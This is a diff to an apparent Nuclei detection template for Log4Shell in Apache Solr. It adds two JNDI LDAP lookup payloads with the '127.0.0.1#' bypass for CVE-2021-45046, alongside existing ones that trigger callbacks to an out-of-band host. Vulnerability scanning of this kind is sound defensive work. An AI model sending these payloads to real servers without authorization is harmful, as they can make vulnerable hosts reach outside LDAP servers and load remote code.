@@ -20,6 +20,8 @@ requests:
       - "{{BaseURL}}/admin/cores?action=CREATE&name=$%7Bjndi:ldap://{{Host}}.{{interactsh-url}}%7D&wt=json"
       - "{{BaseURL}}/solr/admin/info/system?_=${jndi:ldap://{{Host}}.{{interactsh-url}}}&wt=json"
       - "{{BaseURL}}/admin/info/system?_=${jndi:ldap://{{Host}}.{{interactsh-url}}}&wt=json"
+      - "{{BaseURL}}/admin/info/system?_=${jndi:ldap://127.0.0.1%23{{Host}}.{{interactsh-url}}:1389/}&wt=json" #CVE-2021-45046
+      - "{{BaseURL}}/solr/admin/collections?action=$%7Bjndi:ldap://127.0.0.1%23.{{Host}}.{{interactsh-url}}%7D" #CVE-2021-45046
     
     headers:
        User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
